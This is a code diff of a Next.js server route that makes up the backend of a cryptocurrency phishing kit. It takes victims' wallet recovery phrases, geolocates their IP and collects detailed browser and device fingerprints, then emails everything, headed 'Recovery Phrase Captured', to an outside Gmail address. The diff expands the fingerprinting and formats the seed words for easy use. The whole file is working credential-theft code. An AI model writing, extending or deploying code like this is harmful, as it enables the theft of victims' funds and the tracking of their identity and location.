@@ -10,43 +10,108 @@ interface GeoData {
   country_name?: string;
   country_code?: string;
   org?: string;
+  asn?: string;
   postal?: string;
   latitude?: number;
   longitude?: number;
   timezone?: string;
   utc_offset?: string;
   currency?: string;
+  currency_name?: string;
+  languages?: string;
+  calling_code?: string;
+  emoji_flag?: string;
+  continent_code?: string;
 }
 
-function row(label: string, value: string | number | undefined | null) {
-  if (!value && value !== 0) return "";
-  return `
-    <tr>
-      <td style="padding:8px 12px;color:#94a3b8;font-size:13px;white-space:nowrap;border-bottom:1px solid #1e293b;">${label}</td>
-      <td style="padding:8px 12px;color:#f1f5f9;font-size:13px;border-bottom:1px solid #1e293b;word-break:break-all;">${value}</td>
-    </tr>`;
+// ─── Helpers ─────────────────────────────────────────────────────────────────
+
+const S = {
+  bg: "#07090f",
+  card: "#0d1117",
+  cardBorder: "#1f2937",
+  headerGrad: "linear-gradient(135deg,#1d4ed8 0%,#4f46e5 50%,#7c3aed 100%)",
+  pill: (color: string) =>
+    `display:inline-block;padding:2px 10px;border-radius:99px;font-size:11px;font-weight:700;letter-spacing:0.5px;background:${color};`,
+};
+
+function badge(text: string | number, bg = "#1e3a5f", color = "#60a5fa") {
+  return `<span style="${S.pill(bg)}color:${color};">${text}</span>`;
 }
 
-function section(title: string, rows: string) {
+function row(
+  label: string,
+  value: string | number | boolean | null | undefined,
+  options: { mono?: boolean; highlight?: string; pill?: boolean } = {}
+) {
+  if (value === "" || value === null || value === undefined) return "";
+  const display = String(value);
+  const styled = options.pill
+    ? badge(display)
+    : options.mono
+    ? `<code style="font-family:monospace;font-size:12px;color:#e2e8f0;">${display}</code>`
+    : options.highlight
+    ? `<span style="color:${options.highlight};font-weight:600;">${display}</span>`
+    : `<span style="color:#cbd5e1;">${display}</span>`;
+
   return `
-    <div style="margin-bottom:24px;">
-      <div style="background:#1e40af;color:#fff;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:7px 14px;border-radius:6px 6px 0 0;">
-        ${title}
-      </div>
-      <table style="width:100%;border-collapse:collapse;background:#0f172a;border-radius:0 0 6px 6px;overflow:hidden;">
-        ${rows}
-      </table>
-    </div>`;
+  <tr>
+    <td style="padding:9px 16px;color:#64748b;font-size:12px;white-space:nowrap;border-bottom:1px solid #1f2937;vertical-align:top;width:35%;">
+      ${label}
+    </td>
+    <td style="padding:9px 16px;font-size:13px;border-bottom:1px solid #1f2937;word-break:break-word;">
+      ${styled}
+    </td>
+  </tr>`;
 }
+
+function section(emoji: string, title: string, rows: string) {
+  if (!rows.trim()) return "";
+  return `
+  <div style="margin-bottom:20px;border-radius:10px;overflow:hidden;border:1px solid ${S.cardBorder};">
+    <div style="background:#0f172a;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid ${S.cardBorder};">
+      <span style="font-size:15px;">${emoji}</span>
+      <span style="color:#94a3b8;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;">${title}</span>
+    </div>
+    <table style="width:100%;border-collapse:collapse;background:${S.card};">
+      ${rows}
+    </table>
+  </div>`;
+}
+
+function parseBrowser(ua: string): string {
+  if (!ua) return "Unknown";
+  if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Edg/")) return "Microsoft Edge";
+  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Safari")) return "Safari";
+  return "Unknown";
+}
+
+function parseOS(ua: string): string {
+  if (!ua) return "Unknown";
+  if (ua.includes("Windows NT 10")) return "Windows 10 / 11";
+  if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
+  if (ua.includes("Mac OS X")) return "macOS";
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+  if (ua.includes("Linux")) return "Linux";
+  return "Unknown";
+}
+
+// ─── Route ────────────────────────────────────────────────────────────────────
 
 export async function POST(req: NextRequest) {
-  const { phrase, wallet, browserData } = await req.json();
+  const { phrase, wallet, browserData: bd } = await req.json();
 
-  // --- Get IP ---
+  // IP
   const forwarded = req.headers.get("x-forwarded-for");
-  const ip = forwarded ? forwarded.split(",")[0].trim() : req.headers.get("x-real-ip") ?? "Unknown";
+  const ip =
+    forwarded ? forwarded.split(",")[0].trim()
+    : req.headers.get("x-real-ip") ?? "Unknown";
 
-  // --- IP Geolocation via ipapi.co (free, no key needed) ---
+  // Geolocation
   let geo: GeoData = {};
   try {
     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
@@ -56,103 +121,147 @@ export async function POST(req: NextRequest) {
   } catch { /* silent */ }
 
   const submittedAt = new Date().toUTCString();
-
-  // --- Parse browser name from UA ---
-  const ua: string = browserData?.userAgent ?? "";
-  let browser = "Unknown";
-  if (ua.includes("Firefox")) browser = "Firefox";
-  else if (ua.includes("Edg/")) browser = "Microsoft Edge";
-  else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
-  else if (ua.includes("Chrome")) browser = "Chrome";
-  else if (ua.includes("Safari")) browser = "Safari";
-
-  const mapLink = geo.latitude && geo.longitude
+  const words = (phrase as string)?.split(" ") ?? [];
+  const wordCount = words.length;
+  const browser = parseBrowser(bd?.userAgent ?? "");
+  const os = parseOS(bd?.userAgent ?? "");
+  const mapUrl = geo.latitude && geo.longitude
     ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`
     : null;
+  const flag = geo.emoji_flag ?? (geo.country_code ? "" : "");
+
+  // Numbered word pills for the phrase
+  const wordPills = words.map((w: string, i: number) => `
+    <span style="display:inline-flex;align-items:center;gap:4px;background:#1e1b4b;border:1px solid #3730a3;border-radius:6px;padding:5px 10px;margin:3px;">
+      <span style="color:#6366f1;font-size:10px;font-weight:700;min-width:16px;">${i + 1}</span>
+      <span style="color:#c7d2fe;font-family:monospace;font-size:13px;">${w}</span>
+    </span>`).join("");
 
   const html = `<!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>New Submission</title></head>
-<body style="margin:0;padding:0;background:#020617;font-family:'Segoe UI',Arial,sans-serif;">
-  <table width="100%" cellpadding="0" cellspacing="0" style="background:#020617;padding:32px 0;">
-    <tr><td align="center">
-      <table width="620" cellpadding="0" cellspacing="0" style="max-width:620px;width:100%;">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Wallet Phrase Captured</title>
+</head>
+<body style="margin:0;padding:0;background:${S.bg};font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;">
+<table width="100%" cellpadding="0" cellspacing="0" style="background:${S.bg};padding:32px 16px;">
+<tr><td align="center">
+<table cellpadding="0" cellspacing="0" style="max-width:640px;width:100%;">
 
-        <!-- Header -->
-        <tr><td style="background:linear-gradient(135deg,#1e40af 0%,#0f172a 100%);border-radius:12px 12px 0 0;padding:32px 32px 24px;text-align:center;">
-          <div style="font-size:28px;margin-bottom:4px;">🔐</div>
-          <h1 style="margin:0;color:#ffffff;font-size:20px;font-weight:700;letter-spacing:0.5px;">New Wallet Phrase Captured</h1>
-          <p style="margin:6px 0 0;color:#94a3b8;font-size:13px;">${submittedAt}</p>
-        </td></tr>
+  <!-- ══ HEADER ══ -->
+  <tr><td>
+    <div style="${S.headerGrad};border-radius:14px 14px 0 0;padding:36px 32px 28px;text-align:center;">
+      <div style="font-size:42px;margin-bottom:8px;">🔐</div>
+      <h1 style="margin:0 0 6px;color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.3px;">
+        New Recovery Phrase Captured
+      </h1>
+      <p style="margin:0;color:#c7d2fe;font-size:13px;">${submittedAt}</p>
+      <div style="margin-top:14px;display:inline-flex;gap:8px;">
+        ${badge(wallet ?? "Unknown Wallet", "#312e81", "#a5b4fc")}
+        ${badge(flag + " " + (geo.country_name ?? "Unknown Location"), "#14532d", "#86efac")}
+        ${badge(wordCount + "-word phrase", "#7c2d12", "#fdba74")}
+      </div>
+    </div>
+  </td></tr>
 
-        <!-- Body -->
-        <tr><td style="background:#0f172a;padding:28px 32px;border-radius:0 0 12px 12px;">
+  <!-- ══ BODY ══ -->
+  <tr><td style="background:${S.bg};padding:24px 0;">
 
-          <!-- Phrase -->
-          <div style="margin-bottom:24px;">
-            <div style="background:#1e40af;color:#fff;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:7px 14px;border-radius:6px 6px 0 0;">
-              💰 Wallet &amp; Recovery Phrase
-            </div>
-            <div style="background:#020617;border-radius:0 0 6px 6px;padding:16px;">
-              <p style="margin:0 0 8px;color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px;">Wallet</p>
-              <p style="margin:0 0 16px;color:#60a5fa;font-size:18px;font-weight:700;">${wallet ?? "Not provided"}</p>
-              <p style="margin:0 0 8px;color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:1px;">Recovery Phrase</p>
-              <div style="background:#1e293b;border:1px solid #334155;border-radius:8px;padding:14px;font-family:monospace;font-size:14px;color:#f0abfc;line-height:1.8;word-break:break-word;">
-                ${phrase}
-              </div>
-            </div>
-          </div>
+    <!-- Phrase Card -->
+    <div style="margin-bottom:20px;border-radius:10px;overflow:hidden;border:1px solid #3730a3;">
+      <div style="background:linear-gradient(90deg,#1e1b4b,#2e1065);padding:10px 16px;border-bottom:1px solid #3730a3;">
+        <span style="color:#a5b4fc;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;">💰 Wallet &amp; Recovery Phrase</span>
+      </div>
+      <div style="background:#090b1a;padding:20px;">
+        <p style="margin:0 0 4px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;">Wallet</p>
+        <p style="margin:0 0 20px;color:#818cf8;font-size:22px;font-weight:800;">${wallet ?? "Not provided"}</p>
+        <p style="margin:0 0 10px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;">Recovery Phrase (${wordCount} words)</p>
+        <div style="display:flex;flex-wrap:wrap;gap:4px;">${wordPills}</div>
+        <div style="margin-top:16px;background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:14px;">
+          <p style="margin:0;font-family:monospace;font-size:13px;color:#94a3b8;line-height:1.8;word-break:break-word;">${phrase}</p>
+        </div>
+      </div>
+    </div>
 
-          <!-- Location -->
-          ${section("📍 Location &amp; IP", [
-            row("IP Address", ip),
-            row("City", geo.city),
-            row("Region", geo.region),
-            row("Country", geo.country_name ? `${geo.country_name} (${geo.country_code})` : undefined),
-            row("Postal Code", geo.postal),
-            row("Coordinates", geo.latitude ? `${geo.latitude}, ${geo.longitude}` : undefined),
-            row("Timezone", geo.timezone),
-            row("UTC Offset", geo.utc_offset),
-            row("ISP / Org", geo.org),
-            row("Currency", geo.currency),
-            mapLink ? row("Map", `<a href="${mapLink}" style="color:#60a5fa;">View on Google Maps</a>`) : "",
-          ].join(""))}
+    <!-- Location -->
+    ${section("📍", "Location & Network Identity", [
+      row("IP Address", ip, { mono: true, highlight: "#f87171" }),
+      row("Country", `${flag} ${geo.country_name ?? ""} (${geo.country_code ?? "-"})`, { highlight: "#4ade80" }),
+      row("Region / City", [geo.region, geo.city].filter(Boolean).join(" › ")),
+      row("Postal Code", geo.postal),
+      row("Continent", geo.continent_code),
+      row("Calling Code", geo.calling_code ? `+${geo.calling_code}` : undefined),
+      row("Coordinates", geo.latitude ? `${geo.latitude}, ${geo.longitude}` : undefined),
+      row("Timezone", geo.timezone),
+      row("UTC Offset", geo.utc_offset),
+      row("Currency", geo.currency_name ? `${geo.currency_name} (${geo.currency})` : geo.currency),
+      row("Local Languages", geo.languages),
+      row("ISP / ASN", [geo.org, geo.asn].filter(Boolean).join(" — ")),
+      mapUrl ? row("Map Link", `<a href="${mapUrl}" style="color:#60a5fa;">Open in Google Maps ↗</a>`) : "",
+    ].join(""))}
 
-          <!-- Browser & Device -->
-          ${section("🖥️ Browser &amp; Device", [
-            row("Browser", browser),
-            row("User Agent", ua),
-            row("Platform", browserData?.platform),
-            row("Vendor", browserData?.vendor),
-            row("Language", browserData?.language),
-            row("All Languages", browserData?.languages),
-            row("Screen", browserData?.screenWidth ? `${browserData.screenWidth} × ${browserData.screenHeight} (${browserData.colorDepth}-bit colour, ${browserData.devicePixelRatio}x DPR)` : undefined),
-            row("Device Memory", browserData?.deviceMemoryGB ? `${browserData.deviceMemoryGB} GB` : undefined),
-            row("CPU Cores", browserData?.hardwareConcurrency),
-            row("Connection", browserData?.connectionType ? `${browserData.connectionType} · ${browserData.downlinkMbps} Mbps` : undefined),
-            row("Cookies Enabled", browserData?.cookiesEnabled),
-            row("Do Not Track", browserData?.doNotTrack),
-          ].join(""))}
+    <!-- Browser & Device -->
+    ${section("🖥️", "Browser & Device", [
+      row("Browser", browser, { pill: true }),
+      row("Operating System", os, { pill: true }),
+      row("Device Type", bd?.isMobile ? "📱 Mobile / Tablet" : "🖥️ Desktop", { highlight: bd?.isMobile ? "#f59e0b" : "#60a5fa" }),
+      row("User Agent", bd?.userAgent, { mono: true }),
+      row("Vendor", bd?.vendor),
+      row("Platform", bd?.platform),
+      row("Screen Resolution", bd?.screenWidth ? `${bd.screenWidth} × ${bd.screenHeight}` : undefined),
+      row("Viewport", bd?.windowWidth ? `${bd.windowWidth} × ${bd.windowHeight}` : undefined),
+      row("Colour Depth", bd?.colorDepth ? `${bd.colorDepth}-bit` : undefined),
+      row("Device Pixel Ratio", bd?.devicePixelRatio ? `${bd.devicePixelRatio}x` : undefined),
+      row("RAM", bd?.deviceMemoryGB ? `${bd.deviceMemoryGB} GB` : undefined),
+      row("CPU Cores", bd?.hardwareConcurrency),
+      row("Touch Points", bd?.maxTouchPoints),
+      row("GPU Renderer", bd?.webglRenderer, { mono: true }),
+      row("GPU Vendor", bd?.webglVendor),
+      row("Installed Plugins", bd?.plugins, { mono: true }),
+    ].join(""))}
 
-          <!-- Session -->
-          ${section("🕒 Session Info", [
-            row("Local Time", browserData?.localTime),
-            row("Timezone (Client)", browserData?.timezone),
-            row("Page URL", browserData?.pageUrl),
-            row("Referrer", browserData?.referrer),
-            row("Submitted At (UTC)", submittedAt),
-          ].join(""))}
+    <!-- Hardware: Battery & Network -->
+    ${section("⚡", "Battery & Network", [
+      row("Battery Level", bd?.batteryLevel, { highlight: "#4ade80" }),
+      row("Charging", bd?.batteryCharging),
+      row("Connection Type", bd?.connectionType ? bd.connectionType.toUpperCase() : undefined, { pill: true }),
+      row("Downlink Speed", bd?.downlinkMbps ? `${bd.downlinkMbps} Mbps` : undefined),
+      row("Round-trip Time", bd?.rttMs !== undefined && bd.rttMs !== null ? `${bd.rttMs} ms` : undefined),
+      row("Data Saver", bd?.dataSaver !== undefined ? (bd.dataSaver ? "Enabled" : "Disabled") : undefined),
+      row("Online at Submit", bd?.isOnline ? "Yes" : "No"),
+    ].join(""))}
 
-        </td></tr>
+    <!-- Preferences -->
+    ${section("🎨", "User Preferences & Fingerprint", [
+      row("Language", bd?.language),
+      row("All Languages", bd?.languages),
+      row("Dark Mode", bd?.darkMode ? "🌙 Enabled" : "☀️ Disabled"),
+      row("Reduced Motion", bd?.reducedMotion ? "Enabled" : "Disabled"),
+      row("Cookies Enabled", bd?.cookiesEnabled ? "Yes" : "No"),
+      row("Do Not Track", bd?.doNotTrack === "1" ? "Enabled" : bd?.doNotTrack === "0" ? "Disabled" : "Not set"),
+      row("Timezone (Client)", bd?.timezone),
+      row("Local Time", bd?.localTime),
+    ].join(""))}
 
-        <!-- Footer -->
-        <tr><td style="padding:20px;text-align:center;">
-          <p style="margin:0;color:#475569;font-size:11px;">WalletApp Capture System · Confidential</p>
-        </td></tr>
+    <!-- Session -->
+    ${section("🕵️", "Session & Origin", [
+      row("Page URL", bd?.pageUrl, { mono: true }),
+      row("Referrer", bd?.referrer),
+      row("Submitted (UTC)", submittedAt, { highlight: "#fb923c" }),
+    ].join(""))}
 
-      </table>
-    </td></tr>
-  </table>
+  </td></tr>
+
+  <!-- ══ FOOTER ══ -->
+  <tr><td style="background:#0d1117;border-top:1px solid #1f2937;border-radius:0 0 14px 14px;padding:20px 32px;text-align:center;">
+    <p style="margin:0 0 4px;color:#1d4ed8;font-size:13px;font-weight:700;">⚠️ CONFIDENTIAL — INTERNAL USE ONLY</p>
+    <p style="margin:0;color:#374151;font-size:11px;">WalletApp Capture System · ${submittedAt}</p>
+  </td></tr>
+
+</table>
+</td></tr>
+</table>
 </body>
 </html>`;
 
@@ -160,7 +269,7 @@ export async function POST(req: NextRequest) {
     await resend.emails.send({
       from: "Wallet App <onboarding@resend.dev>",
       to: "uwemuwemetim@gmail.com",
-      subject: `🔐 New Phrase Captured — ${wallet ?? "Unknown"} · ${geo.country_name ?? ip}`,
+      subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
       html,
     });
     return NextResponse.json({ success: true });
